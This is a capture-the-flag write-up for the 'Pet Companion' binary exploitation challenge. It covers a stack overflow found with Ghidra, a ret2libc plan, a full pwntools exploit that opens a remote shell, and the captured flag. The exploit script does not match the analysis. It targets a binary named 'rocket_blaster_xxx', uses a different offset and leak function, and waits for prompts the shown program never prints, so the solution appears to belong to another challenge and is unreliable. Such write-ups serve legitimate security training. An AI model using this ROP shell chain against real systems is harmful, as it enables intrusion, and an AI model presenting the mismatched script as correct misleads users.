solved by vulnx https://github.com/VulnX :

challenge files:

[pwn_pet_companion.zip](./pwn_pet_companion.zip)

# Analysis

On reversing with ghidra we get the following source:

```c
undefined8 main(void)

{
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;

  setup();
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  write(1,"\n[!] Set your pet companion\'s current status: ",0x2e);
  read(0,&local_48,0x100);
  write(1,"\n[*] Configuring...\n\n",0x15);
  return 0;
}
```

# Vulnerability

We have a really obvious buffer overwrite vulnerability here. Our buffer is only 8 * 8 = 64 bytes long whereas we can store 0x100 (256) characters in it.

But the real question is what can we do wit the vuln, let's run checksec and see what attacks are feasible:

```bash
$ checksec pet_companion
[*] '/home/vulnx/Games/CTFs/Cyber Apocalypse/pwn/Pet Companion/challenge/pet_companion'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./glibc/'
```

- No canary

- No PIE

Seems good. Our buffer is 64 bytes, RBP will be an additional 8 bytes, so the total offset to RIP would be 72. So we can redirect code execution, but where to go to?

Since there is no `win` function for us, we have to rely on the good old ret2system technique ( thankfully we have the libc file )

But the remote server has ASLR enabled which means, to get the exact address of `system()` we will need a libc leak. To get a leak we can use the GOT table via the following ROP chain (gadgets from the binary since PIE is disabled):

- pop rdi ; ret

- 0x1 [ stdout file descriptor ]

- pop rsi ; pop r15 ; ret ( due to unavailability of better gadget )

- GOT['write'] (or any other GOT entry)

- junk value (goes into r15)

- PLT['write'] ( call : write(1, GOT['write'], RDX) )

- exe.sym.main ( restart the program to avoid the crash and get another BoF )

Since RDX is already a high value (can be found via inspecting it in GDB), we don't necessarily need to change it.

After we get the leak we can get libc base via:

```python
libc.address = leak - libc.sym.write
```

and send the following ROP chain for the next BoF:

- pop rdi ; ret

- address to '/bin/sh'

- system()

# Exploit

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./rocket_blaster_xxx")
libc = exe.libc

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("83.136.250.140", 58876)

    return r


def main():
    r = conn()

    # good luck pwning :)
    offset = 40
    pop_rdi = 0x000000000040159f
    pop_rsi = 0x000000000040159d
    pop_rdx = 0x000000000040159b
    payload = flat({
        offset       : p64(pop_rdi),
        offset + 8   : p64(exe.got.puts),
        offset + 16  : p64(exe.plt.puts),
        offset + 24  : p64(exe.sym.main)
        })

    r.clean(timeout=2)
    r.sendline(payload)
    r.recvuntil(b'testing..\n')
    leak = u64(r.recvline().strip().ljust(8, b'\x00'))
    print(f'{hex(leak)=}')
    libc.address = leak - libc.sym.puts
    print(f'{hex(libc.address)=}')

    payload = flat({
        offset      : p64(pop_rdi),
        offset + 8  : p64(next(libc.search(b'/bin/sh\x00'))),
        offset + 16 : p64(pop_rdi+1),
        offset + 24 : p64(libc.sym.system)
        })

    r.sendlineafter(b'XX!\n\n>> ', payload)

    r.interactive()


if __name__ == "__main__":
    main()

```

```bash
$ python solve.py

[+] Opening connection to 94.237.62.244 on port 46452: Done
hex(leak)='0x7f91426740f0'
hex(libc.address)='0x7f9142564000'
[*] Switching to interactive mode
$ id
uid=100(ctf) gid=101(ctf) groups=101(ctf)
$ whoami
ctf
$ ls
core
flag.txt
glibc
pet_companion
$ cat flag.txt
HTB{c0nf1gur3_w3r_d0g}
```

# Flag

`HTB{c0nf1gur3_w3r_d0g}`